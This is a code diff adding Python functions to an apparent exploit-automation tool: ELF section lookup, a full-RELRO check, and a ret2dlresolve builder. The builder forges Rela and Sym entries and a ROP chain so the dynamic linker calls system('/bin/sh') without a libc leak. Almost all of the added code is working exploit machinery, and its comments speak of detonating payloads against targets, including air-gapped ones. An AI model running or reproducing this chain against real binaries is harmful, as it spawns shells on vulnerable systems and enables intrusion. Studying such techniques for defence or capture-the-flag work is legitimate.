@@ -364,6 +364,107 @@ def got_entry(data: bytes, name: str):
     return None
 
 
+def section_addr(data: bytes, name: str):
+    """The runtime VADDR (sh_addr) of section `name`, or None. For a no-PIE target this is the
+    fixed address of .rela.plt / .dynsym / .dynstr / .plt that a ret2dlresolve forges against."""
+    try:
+        is64, endc = _elf_class_endian(data)
+        if is64:
+            e_shoff = struct.unpack_from(endc + "Q", data, 0x28)[0]
+            she, shn, shx = struct.unpack_from(endc + "HHH", data, 0x3A)
+            fmt = endc + "IIQQQQIIQQ"
+        else:
+            e_shoff = struct.unpack_from(endc + "I", data, 0x20)[0]
+            she, shn, shx = struct.unpack_from(endc + "HHH", data, 0x2E)
+            fmt = endc + "IIIIIIIIII"
+        shs = [struct.unpack_from(fmt, data, e_shoff + i * she) for i in range(shn)]
+        so = shs[shx][4]
+        for sh in shs:
+            end = data.find(b"\x00", so + sh[0])
+            if data[so + sh[0]:end].decode("latin-1", "replace") == name and sh[3]:
+                return sh[3]                            # sh_addr
+    except Exception:
+        pass
+    return None
+
+
+def has_bind_now(data: bytes) -> bool:
+    """True if the target binds EAGERLY (full RELRO: DT_BIND_NOW / DF_BIND_NOW / DF_1_NOW). Lazy
+    PLT resolution is then off, so ret2dlresolve does not apply -- the resolver is never reached
+    through the PLT. Feasibility is a property of the TARGET binary, not the host's glibc, so this
+    stays correct when the exploit later runs against a different (e.g. older) loader."""
+    secs = _sections(data)
+    dyn = secs.get(".dynamic")
+    if not dyn:
+        return False
+    is64, endc = _elf_class_endian(data)
+    off, size = dyn[0], dyn[1]
+    ent = 16 if is64 else 8
+    tagfmt = endc + ("qQ" if is64 else "iI")
+    DT_BIND_NOW, DT_FLAGS, DT_FLAGS_1 = 24, 30, 0x6ffffffb
+    for o in range(off, off + size, ent):
+        try:
+            tag, val = struct.unpack_from(tagfmt, data, o)
+        except struct.error:
+            break
+        if tag == 0:                                   # DT_NULL: end of .dynamic
+            break
+        if tag == DT_BIND_NOW:
+            return True
+        if tag == DT_FLAGS and (val & 0x8):            # DF_BIND_NOW
+            return True
+        if tag == DT_FLAGS_1 and (val & 0x1):          # DF_1_NOW
+            return True
+    return False
+
+
+def build_ret2dlresolve(offset, *, read_plt, plt0, pop_rdi, pop_rsi, pop_rdx, ret_gadget,
+                        jmprel, symtab, strtab, scratch, symbol=b"system", arg=b"/bin/sh",
+                        align=False):
+    """A leak-free ret2libc via the dynamic linker. Forge, in writable `scratch`, an Elf64_Rela +
+    Elf64_Sym + the symbol string so that _dl_runtime_resolve resolves `symbol` (e.g. "system")
+    and immediately calls it with rdi = &arg -- no libc leak, no `system` PLT entry needed. Works
+    on ANY loader that still binds this target lazily (older glibc included; that is the common
+    air-gap case), because everything forged comes from the TARGET binary's own tables.
+
+    Returns (chain, data): the stage-1 ROP `chain` reads `data` into `scratch` via
+    read(0, scratch, n), sets rdi = &arg, then drops into PLT0 with the forged reloc index.
+    `align=True` inserts one `ret` for the 16-byte-aligned rsp system()/do_system needs -- the
+    re-entered frame's parity is environment-dependent, so the caller detonates BOTH ways.
+    """
+    def q(v):
+        return struct.pack("<Q", v & (2**64 - 1))
+
+    def _aligned(a, base):                             # advance a to the next 24-byte grid vs base
+        while (a - base) % 24:
+            a += 1
+        return a
+
+    gotslot = scratch                                  # 8-byte slot the resolver writes into; kept
+    sym_a = _aligned(scratch + 8, symtab)              # BEFORE the structures so its write can't
+    rela_a = _aligned(sym_a + 24, jmprel)              # clobber the Sym/Rela or the arg string
+    str_a = rela_a + 24                                # the symbol name string
+    arg_a = str_a + len(symbol) + 1                    # the argument string (e.g. "/bin/sh")
+    sym_index = (sym_a - symtab) // 24
+    reloc_index = (rela_a - jmprel) // 24
+    n = (arg_a + len(arg) + 1) - scratch
+
+    data = bytearray(n)
+    data[sym_a - scratch:sym_a - scratch + 24] = struct.pack(
+        "<IBBHQQ", str_a - strtab, 0x12, 0, 0, 0, 0)   # st_name, st_info=STB_GLOBAL|STT_FUNC
+    data[rela_a - scratch:rela_a - scratch + 24] = struct.pack(
+        "<QQq", gotslot, (sym_index << 32) | 7, 0)     # r_offset, r_info=(sym<<32)|JMP_SLOT(7)
+    data[str_a - scratch:str_a - scratch + len(symbol) + 1] = symbol + b"\x00"
+    data[arg_a - scratch:arg_a - scratch + len(arg) + 1] = arg + b"\x00"
+
+    chain = (b"A" * offset
+             + q(pop_rdi) + q(0) + q(pop_rsi) + q(scratch) + q(pop_rdx) + q(n) + q(read_plt)
+             + q(pop_rdi) + q(arg_a)
+             + (q(ret_gadget) if align else b"")
+             + q(plt0) + q(reloc_index))
+    return bytes(chain), bytes(data)
+
+
 def _jcc_at(seg, p):
     """True if seg[p:] begins an equality conditional jump: short jz/jnz (74/75) or the near
     two-byte forms (0f 84 / 0f 85). Compilers pick either depending on the branch distance."""
